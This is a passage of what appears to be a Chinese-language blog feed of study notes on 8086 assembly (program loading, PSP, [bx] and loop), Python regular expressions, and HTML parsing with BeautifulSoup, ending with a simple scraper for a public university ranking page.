id="实例1">实例1</h5><p>debug将程序从可执行文件加载入内存后，cx中存放的是程序的长度（cx=000F：程序的机器码共有15个字节）</p><p>exe文件中的程序的加载过程：</p><ul><li><p>找到一段起始地址为SA：0000（即起始地址的偏移地址为0）的容量足够的空闲内存区</p></li><li><p>在这段内存区的前256个字节中，创建一个称为程序的前缀（PSP）的数据区，DOS利用PSP来和被加载程序进行通信</p></li><li><p>从这段内存的256字节处开始（在PSP的后面），将程序装入，程序的地址被设为SA+10H：0</p><p>（空闲的内存区从SA：0开始，0-255字节为PSP，从256字节处开始存放程序。为更好地区分PSP和程序，DOS一般将它们划分到不同的段中，所以会有这样的地址安排：空闲内存区：SA：0；PSP区：SA：0；程序区：SA+10H：0。注意：PSP区和程序区虽然物理地址连续，却有不同的段地址）</p></li><li><p>将该内存的段地址存入DS中，初始化其他相关寄存器后，设置CS：IP指向程序的入口</p></li><li><p>总结：</p><ul><li><p>程序加载后，ds中存放着程序所在内存区的段地址，这个内存区的偏移地址为0，则程序所在的内存区的地址为ds：0</p></li><li><p>这个内存区的前256个字节中存放的是PSP，dos用来和程序进行通信</p></li><li><p>从256字节处向后的空间存放的是程序</p></li><li><p>所以从ds中可以得到PSP的段地址SA，PSP的偏移地址为0，则物理地址为SA*16+0</p></li><li><p>因为PSP占256（100H）字节，所以程序的物理地址是：</p><p>SA * 16+0+256=SA * 16+16 * 16=（SA+16）*16+0</p><p>可用段地址和偏移地址表示为SA+10：0</p></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>汇编基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>5-[bx]和loop指令</title>
    <link href="/2022/02/16/5%5Bbx%5D%E5%92%8Cloop%E6%8C%87%E4%BB%A4/"/>
    <url>/2022/02/16/5%5Bbx%5D%E5%92%8Cloop%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1>[bx]和内存单元的描述</h1><h5 id="1、完整地描述一个内存单元">1、完整地描述一个内存单元</h5><ul><li>内存单元的指针</li><li>内存单元的长度</li></ul><h5 id="2、">2、</h5><p>用[0]表示一个内存单元时，0表示单元的偏移地址，段地址默认在ds中，单元的长度（类型）可以由具体指令的其他操作对象（比如寄存器）指出（如ax，al）</p><h5 id="3、">3、</h5><p>[bx]也表示一个内存单元，它的偏移地址在bx中</p><h5 id="4、一些规范">4、一些规范</h5><p>（）：表示一个寄存器或一个内存单元中的内容</p><p>idata：常量</p><h5 id="5、指令实例">5、指令实例</h5><p>mov ax,[bx]</p><ul><li>功能：bx中存放的数据作为一个偏移地址EA，段地址SA默认在ds中，将SA：EA中的数据送入ax中</li><li>即：（ax）=（ds*16+（bx））</li></ul><h5 id="6、">6、</h5><p>inc：自增（相当于++）</p><p>int 21：程序结尾</p><h1>loop指令</h1><h5 id="1、格式：loop-标号">1、格式：loop 标号</h5><h5 id="2、cx和loop非常相关">2、cx和loop非常相关</h5><h5 id="3、loop指令分两步">3、loop指令分两步</h5><ul><li>(cx)=(cx)-1</li><li>判断cx中的值，不为0则转至标号处执行程序，如果为0则向下执行</li></ul><h5 id="4、">4、</h5><p>通常cx中存放着循环次数</p><h5 id="5、编程计算2-12">5、编程计算2^12^</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">assume cs:code<br>code segment<br>mov ax,2<br>mov cx,11<br>   s:add ax,ax<br>    loop s<br>    <br>    mov ax,4c00h<br>    int 21h<br>    <br>code ends<br>end   <br></code></pre></td></tr></table></figure><p>标号代表一个地址（如代码中的s）</p><h1>loop和[bx]的联合应用</h1><h1>一段安全的空间</h1><p>在一般的PC机中，DOS方式下，DOS和其他合法的程序一般都不会使用0：200~0：2FF（h）的256个字节的空间，使用这段空间比较安全</p>]]></content>
    
    
    <categories>
      
      <category>汇编基础</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>5-正则表达式</title>
    <link href="/2022/02/16/%E7%88%AC%E8%99%AB5%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    <url>/2022/02/16/%E7%88%AC%E8%99%AB5%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h3 id="定义">定义</h3><p>正则表达式是用来简洁表达一组字符串的表达式，是一种通用的字符串表达框架</p><h3 id="语法">语法</h3><p>字符+操作符</p><table><thead><tr><th>操作符</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>.</td><td>表示任何单个字符</td><td></td></tr><tr><td>[ ]</td><td>字符集，对单个字符给出取值范围</td><td>[abc]表示a、b、c、，[a-z]表示a到z的单个字符</td></tr><tr><td>[^ ]</td><td>非字符集，对单个字符给出排除范围</td><td>[^abc]表示非a或b或c的单个字符</td></tr><tr><td>*</td><td>前一个字符0次或无限次扩展</td><td>abc* 表示 ab、abc、abcc、abccc等</td></tr><tr><td>+</td><td>前一个字符1次或无限次扩展</td><td>abc+ 表示 abc、abcc、abccc等</td></tr><tr><td>?</td><td>前一个字符0次或1次扩展</td><td>abc? 表示 ab、abc</td></tr><tr><td>|</td><td>左右表达式任意一个</td><td>abc|def 表示 abc、def</td></tr><tr><td>{m}</td><td>扩展前一个字符m次</td><td>ab{2}c表示abbc</td></tr><tr><td>{m,n}</td><td>扩展前一个字符m至n次（含n）</td><td>ab{1,2}c表示abc、abbc</td></tr><tr><td>^</td><td>匹配字符串开头</td><td>^abc表示abc且在一个字符串的开头</td></tr><tr><td>$</td><td>匹配字符串结尾</td><td>abc$表示abc且在一个字符串的结尾</td></tr><tr><td>( )</td><td>分组标记，内部只能使用|操作符</td><td>(abc)表示abc、（abc|def）表示abc、def</td></tr><tr><td>\d</td><td>数字，等价于[0-9]</td><td></td></tr><tr><td>\w</td><td>单词字符，等价于[A-Za-z0-9]</td><td></td></tr></tbody></table><h3 id="常用示例">常用示例</h3><table><thead><tr><th>^[A-Za-z]+$</th><th>由26个字母组成的字符串</th></tr></thead><tbody><tr><td>^[A-Za-z0-9]+$</td><td>由26个字母和数字组成的字符串</td></tr><tr><td>^-?\d+$</td><td>整数形式的字符串</td></tr><tr><td>^[0-9] * [1-9] [0-9] * $</td><td>正整数形式的字符串</td></tr><tr><td>[1-9]\d{5}</td><td>中国境内邮政编码，6位</td></tr><tr><td>[\u4e00-\u9fa5]</td><td>匹配中文字符</td></tr><tr><td>\d{3}-\d{8}|\d{4}-\d{7}</td><td>国内电话号码，010-68913536</td></tr></tbody></table><h3 id="匹配IP地址的正则表达式">匹配IP地址的正则表达式</h3><ul><li>IP地址分4段，每段0-255</li><li>\d+.\d+.\d+.\d+ 或 \d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}</li><li>精确写法：<ul><li>0-99：[1-9]?\d</li><li>100-199：1\d{2}</li><li>200-249：2[0-4]\d</li><li>250-255：25[0-5]</li><li>(([1-9]?\d|1\d{2}|2[0-4]\d|25[0-5]).){3}([1-9]?\d|1\d{2}|2[0-4]\d|25[0-5])</li></ul></li></ul><h3 id="正则表达式的表示类型">正则表达式的表示类型</h3><h6 id="raw-string类型（原生字符串类型）">raw string类型（原生字符串类型）</h6><ul><li>r ’ text ’</li><li>raw string是不包含对转义符再次转义的字符串</li></ul><h6 id="string类型：更加繁琐">string类型：更加繁琐</h6><h3 id="re库主要功能函数">re库主要功能函数</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>re.search( )</td><td>在一个字符串中搜索匹配正则表达式的第一个位置，<strong>返回match对象</strong></td></tr><tr><td>re.match( )</td><td>从一个字符的开始位置起匹配正则表达式，<strong>返回match对象</strong></td></tr><tr><td>re.findall( )</td><td>搜索字符串，以列表类型返回全部能匹配的子串</td></tr><tr><td>re.split( )</td><td>将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</td></tr><tr><td>re.finditer( )</td><td>搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是<strong>match对象</strong></td></tr><tr><td>re.sub( )</td><td>在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</td></tr></tbody></table><ul><li><p>re.search(pattern,string,flags=0)</p><ul><li>在一个字符串中搜索匹配正则表达式的第一个位置，返回match对象</li><li>pattern：正则表达式的字符串或原生字符串表示</li><li>string：待匹配字符串</li><li>flags：正则表达式使用时的控制标记</li></ul><table><thead><tr><th>常用标记</th><th>说明</th></tr></thead><tbody><tr><td>re.I   re.IGNORECASE</td><td>忽略正则表达式的大小写，[A-Z]能够匹配小写字符</td></tr><tr><td>re.M   re.MULTILINE</td><td>正则表达式中的^操作符能够将给定字符串的每行当作匹配开始</td></tr><tr><td>re.S   re.DOTALL</td><td>正则表达式中的.操作符能够匹配所有字符，默认匹配除换行外的所有字符</td></tr></tbody></table></li><li><p>re.match(pattern,string,flags=0)</p><ul><li>从一个字符的开始位置起匹配正则表达式，返回match对象</li><li>pattern：正则表达式的字符串或原生字符串表示</li><li>string：待匹配字符串</li><li>flags：正则表达式使用时的控制标记</li></ul></li><li><p>re.findall(pattern,string,flags=0)</p><ul><li>搜索字符串，以列表类型返回全部能匹配的子串</li></ul></li><li><p>re.split(pattern,string,maxsplit=0,flags=0)</p><ul><li>将一个字符串按照正则表达式匹配结果进行分割，返回列表类型</li><li>maxsplit：最大分割数，剩余部分作为最后一个元素输出</li></ul></li><li><p>re.finditer(pattern,string,flags=0)</p><ul><li>搜索字符串，返回一个匹配结果的迭代类型，每个迭代元素是match对象</li></ul></li><li><p>re.sub(pattern,repl,string,coount=0,flags=0)</p><ul><li>在一个字符串中替换所有匹配正则表达式的子串，返回替换后的字符串</li><li>repl：替换匹配字符串的字符串</li><li>count：匹配的最大替换次数</li></ul></li></ul><h3 id="re库之面向对象">re库之面向对象</h3><h6 id="re库的等价用法">re库的等价用法</h6><ul><li>函数用法：一次性操作</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">rst = re.search(<span class="hljs-string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>,<span class="hljs-string">&#x27;BIT 10081&#x27;</span>)<br></code></pre></td></tr></table></figure><ul><li>面向对象用法：编译后的多次操作</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">pat = re.comile(<span class="hljs-string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>)<br>rst = pat.search(<span class="hljs-string">&#x27;BIT 100081&#x27;</span>)<br></code></pre></td></tr></table></figure><h6 id="match">match</h6><ul><li>match对象是一次匹配的结果，包含匹配的很多信息</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r&#x27;[1-9]\d&#123;5&#125;&#x27;</span>, <span class="hljs-string">&#x27;BIT 100081&#x27;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-keyword">match</span>.group(<span class="hljs-number">0</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(<span class="hljs-keyword">match</span>))<br><br><span class="hljs-comment"># 100081</span><br><span class="hljs-comment"># &lt;class &#x27;re.Match&#x27;&gt;</span><br></code></pre></td></tr></table></figure><h6 id="match对象的属性">match对象的属性</h6><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>.string</td><td>待匹配的文本</td></tr><tr><td>.re</td><td>匹配时使用的pattern对象（正则表达式）</td></tr><tr><td>.pos</td><td>正则表达式搜索文本的开始位置</td></tr><tr><td>.endpos</td><td>正则表达式搜索文本的结束位置</td></tr></tbody></table><h6 id="match对象的方法">match对象的方法</h6><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>.group(0)</td><td>获得匹配后的字符串</td></tr><tr><td>.start( )</td><td>匹配字符串在原始字符串的开始位置</td></tr><tr><td>.end( )</td><td>匹配字符串在原始字符串的结束位置</td></tr><tr><td>.span( )</td><td>返回(.start( ), .end( ))</td></tr></tbody></table><h6 id="match库的贪婪匹配原则">match库的贪婪匹配原则</h6><p>同时匹配长短不同的多项，输出匹配最长的子串</p><h6 id="最小匹配原则">最小匹配原则</h6><p>输出最小子串</p><table><thead><tr><th>操作符</th><th>说明</th></tr></thead><tbody><tr><td>*？</td><td>前一个字符0次或无限次扩展，最小匹配</td></tr><tr><td>+？</td><td>前一个字符1次或无限次扩展，最小匹配</td></tr><tr><td>？？</td><td>前一个字符0次或1次扩展，最小匹配</td></tr><tr><td>{m,n}?</td><td>扩展前一个字符m至n次（含n），最小匹配</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>4-信息的组织与提取</title>
    <link href="/2022/02/16/%E7%88%AC%E8%99%AB4%E4%BF%A1%E6%81%AF%E7%9A%84%E7%BB%84%E7%BB%87%E4%B8%8E%E6%8F%90%E5%8F%96/"/>
    <url>/2022/02/16/%E7%88%AC%E8%99%AB4%E4%BF%A1%E6%81%AF%E7%9A%84%E7%BB%84%E7%BB%87%E4%B8%8E%E6%8F%90%E5%8F%96/</url>
    
    <content type="html"><![CDATA[<h3 id="信息标记的形式">信息标记的形式</h3><ul><li>XML（extensible markup language，扩展标记语言）标签<ul><li>用尖括号表达信息</li><li>最早的通用信息标记语言，可扩展性好，但是繁琐</li><li>应用：Internet上的信息交互与传递</li></ul></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">person</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">firstName</span>&gt;</span>A<span class="hljs-tag">&lt;/<span class="hljs-name">firstName</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">lastName</span>&gt;</span>B<span class="hljs-tag">&lt;/<span class="hljs-name">lastName</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">address</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">streetAddr</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">streetAddr</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">city</span>&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">city</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">address</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">prof</span>&gt;</span>xx<span class="hljs-tag">&lt;/<span class="hljs-name">prof</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">prof</span>&gt;</span>xx<span class="hljs-tag">&lt;/<span class="hljs-name">prof</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">person</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li><p>JSON（JavaScript Object Notation）</p><ul><li><p>有类型的键值对构建的信息表达方式：“key”:“value”</p></li><li><p>一个键对应多个值时，用[ , ]组织值：“key”:[“value1”,“value2”]</p></li><li><p>键值对嵌套使用时用{ ，}组织：“key”:{“subkey”:“subvalue”}</p></li><li><p>信息有类型，适合程序处理（js），较XML简洁</p></li><li><p>应用：移动应用云端和节点的信息通信，无注释、程序对接口处理的地方</p></li></ul></li></ul><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;firstName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;A&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;lastName&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;B&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;streetAddr&quot;</span><span class="hljs-punctuation">:</span>xxx<span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;city&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;xxx&quot;</span><br><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;prof&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-string">&quot;xx&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-string">&quot;xx&quot;</span><span class="hljs-punctuation">]</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><ul><li>YAML（YAML Ain’t Markup Language）<ul><li>采用无类型的键值对： key:value</li><li>所属关系用缩进表达</li><li>用减号“-”表达并列关系</li><li>用竖线“|”表示整块数据</li><li>用井号“#”表示注释</li><li>信息无类型，文本信息比例高，可读性好</li><li>应用：各类系统的配置文件中，有注释，易读</li></ul></li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">firstName:A</span><br><span class="hljs-string">lastName:B</span><br><span class="hljs-attr">address:</span><br><span class="hljs-string">streetAddr:xxx,</span><br><span class="hljs-string">city:xxx</span><br><span class="hljs-attr">prof:</span><br><span class="hljs-string">-xx</span><br><span class="hljs-string">-xx</span><br></code></pre></td></tr></table></figure><h3 id="信息提取的一般方法">信息提取的一般方法</h3><p>:one:完整解析信息的标记形式，再提取关键信息</p><ul><li>优点：信息提取准确</li><li>缺点：提取过程繁琐，速度慢</li></ul><p>:two:无视标记形式，直接搜索关键信息</p><ul><li>优点：提取过程简洁，速度较快</li><li>缺点：提取结果准确性与信息内容相关</li></ul><h6 id="实例">实例</h6><p>提取HTML中所有的URL链接</p><p>①搜索所有的&lt; a&gt;标签</p><p>②解析&lt; a&gt;标签格式，提取href后的链接内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">soup = BeautifulSoup(demo, <span class="hljs-string">&quot;html.parser&quot;</span>)<br><br><span class="hljs-keyword">for</span> link <span class="hljs-keyword">in</span> soup.find_all(<span class="hljs-string">&#x27;a&#x27;</span>):<br>    <span class="hljs-built_in">print</span>(link.get(<span class="hljs-string">&#x27;href&#x27;</span>))<br></code></pre></td></tr></table></figure><h5 id="find-all-name-attrs-recursive-string-kwargs">&lt;&gt;.find_all(name,attrs,recursive,string,* *kwargs)</h5><ul><li><p>返回一个列表类型，存储查找的结果</p></li><li><p>name：对标签名称的检索字符串</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> re<br><br>r = requests.get(<span class="hljs-string">&quot;http://python123.io/ws/demo.html&quot;</span>)<br>demo = r.text<br><br>soup = BeautifulSoup(demo, <span class="hljs-string">&quot;html.parser&quot;</span>)<br><span class="hljs-built_in">print</span>(soup.find_all(<span class="hljs-string">&#x27;a&#x27;</span>))<br><span class="hljs-built_in">print</span>(soup.find_all([<span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>]))  <span class="hljs-comment"># 多个标签名时用列表</span><br><br><span class="hljs-keyword">for</span> tag <span class="hljs-keyword">in</span> soup.find_all(<span class="hljs-literal">True</span>):<br>    <span class="hljs-built_in">print</span>(tag.name)<br><br><span class="hljs-comment"># 打印以b开头的标签名称（正则表达式）</span><br><span class="hljs-keyword">for</span> tag <span class="hljs-keyword">in</span> soup.find_all(re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;b&#x27;</span>)):<br>    <span class="hljs-built_in">print</span>(tag.name)<br></code></pre></td></tr></table></figure><ul><li>attrs：对标签属性值的检索字符串，可标注属性检索</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(soup.find_all(<span class="hljs-string">&#x27;p&#x27;</span>, <span class="hljs-string">&#x27;course&#x27;</span>))<br><span class="hljs-built_in">print</span>(soup.find_all(<span class="hljs-built_in">id</span>=<span class="hljs-string">&#x27;link1&#x27;</span>))<br><span class="hljs-comment"># 使用正则表达式，找到id属性含link的标签（link1、link2...）</span><br><span class="hljs-built_in">print</span>(soup.find_all(<span class="hljs-built_in">id</span>=re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;link&#x27;</span>)))<br></code></pre></td></tr></table></figure><ul><li>recursive：是否对子孙全部搜索，默认True</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">soup.find_all(<span class="hljs-string">&#x27;a&#x27;</span>)<br>--&gt;  [&lt;...&gt;...&lt;..&gt;]<br>soup.find_all(<span class="hljs-string">&#x27;a&#x27;</span>,recursive=<span class="hljs-literal">False</span>)<br>--&gt;  []   说明儿子节点层面上没有a标签<br></code></pre></td></tr></table></figure><ul><li>string：&lt;&gt;…&lt;/&gt;中字符串区域的检索字符串</li><li>扩展方法</li></ul><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>&lt;&gt;.find()</td><td>搜索且只返回一个结果，字符串类型，同.find_all()参数</td></tr><tr><td>&lt;&gt;.find_parents()</td><td>在先辈节点中搜索，返回列表类型，同.find_all()参数</td></tr><tr><td>&lt;&gt;.find_parent()</td><td>在先辈节点中返回一个结果，字符串类型，同.find()参数</td></tr><tr><td>&lt;&gt;.find_next_siblings()</td><td>在后续平行节点中搜索，返回列表类型，同.find_all()参数</td></tr><tr><td>&lt;&gt;.find_next_sibling()</td><td>在后续平行节点中返回一个结果，字符串类型，同.find()参数</td></tr><tr><td>&lt;&gt;.find_previous_siblings()</td><td>在前序平行节点中搜索，返回列表类型，同.find_all()参数</td></tr><tr><td>&lt;&gt;.find_previous_sibling()</td><td>在前序平行节点中返回一个结果，字符串类型，同.find()参数</td></tr></tbody></table><h3 id="实例：定向爬取中国大学排名">实例：定向爬取中国大学排名</h3><h6 id="可行性：">可行性：</h6><ul><li>信息写于HTML页面中</li><li>定向：只爬取一个页面，不爬取页面中的链接</li><li>查看robots协议</li></ul><h6 id="程序的结构设计">程序的结构设计</h6><p>:one:从网络上获取大学排名网页信息：getHTMLText( )</p><p>:two:提取网页内容中信息到合适的数据结构：fillUnivList( )</p><p>:three:利用数据结构展示并输出结果：printUnivList( )</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> bs4.element<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> bs4 <span class="hljs-keyword">import</span> BeautifulSoup<br><span class="hljs-keyword">import</span> bs4<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getHTMLTex</span>(<span class="hljs-params">url</span>):  <span class="hljs-comment"># 获取URL信息，输出内容</span><br>    <span class="hljs-keyword">try</span>:<br>        r = requests.get(url, timeout=<span class="hljs-number">30</span>)<br>        r.raise_for_status()<br>        r.encoding = r.apparent_encoding<br>        <span class="hljs-keyword">return</span> r.text<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span><br><br><br><span class="hljs-comment"># 核心部分</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fillUnivList</span>(<span class="hljs-params">ulist, html</span>):  <span class="hljs-comment"># 将html页面放到ulist列表中(核心)</span><br>    soup = BeautifulSoup(html, <span class="hljs-string">&quot;html.parser&quot;</span>)<br>    <span class="hljs-keyword">for</span> tr <span class="hljs-keyword">in</span> soup.find(<span class="hljs-string">&#x27;tbody&#x27;</span>).children:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(tr, bs4.element.Tag):  <span class="hljs-comment"># 过滤掉非标签类型的数据（string）</span><br>            a = tr(<span class="hljs-string">&#x27;a&#x27;</span>)<br>            tds = tr(<span class="hljs-string">&#x27;td&#x27;</span>)  <span class="hljs-comment"># 将所有的td标签存到一个列表中</span><br>            ulist.append([tds[<span class="hljs-number">0</span>].text.strip(), a[<span class="hljs-number">0</span>].string.strip(), tds[<span class="hljs-number">4</span>].text.strip()])<br><br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">所有大学排名的信息被封装在一个标签为tbody的表格中</span><br><span class="hljs-string">每一个大学的信息又被封装在tr标签中（每一个tr标签包含了所有当前大学的数据信息</span><br><span class="hljs-string">每个tr中的信息又被td标签所包围</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">printUnivList</span>(<span class="hljs-params">ulist, num</span>):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;0:^10&#125;\t&#123;1:^6&#125;\t&#123;2:^10&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&quot;排名&quot;</span>, <span class="hljs-string">&quot;学校名称&quot;</span>, <span class="hljs-string">&quot;总分&quot;</span>, <span class="hljs-built_in">chr</span>(<span class="hljs-number">12288</span>)))<br>    <span class="hljs-comment"># 0、1、2为槽,&#123;3&#125;表示若宽度不够,使用format的3号位置处的chr(12288)(中文空格)进行填充</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num):<br>        u = ulist[i]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;0:^10&#125;\t&#123;1:^6&#125;\t&#123;2:^10&#125;&quot;</span>.<span class="hljs-built_in">format</span>(u[<span class="hljs-number">0</span>], u[<span class="hljs-number">1</span>], u[<span class="hljs-number">2</span>]), <span class="hljs-built_in">chr</span>(<span class="hljs-number">12288</span>))<br>        <span class="hljs-built_in">print</span>()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    uinfo = []<br>    url = <span class="hljs-string">&#x27;https://www.shanghairanking.cn/rankings/bcur/202111&#x27;</span><br>    html = getHTMLTex(url)<br>    fillUnivList(uinfo, html)<br>    printUnivList(uinfo, <span class="hljs-number">20</span>)<br><br><br>main()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>爬虫</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>6-爬虫实例</title>
    <link href="/2022/02/16/%E7%88%AC%E8%99%AB6%E5%AE%9E%E4%BE%8B/"/>
    <url>/2022/02/16/%E7%88%AC%E8%99%AB6%E5%AE%9E%E4%BE%8B/</url>
    
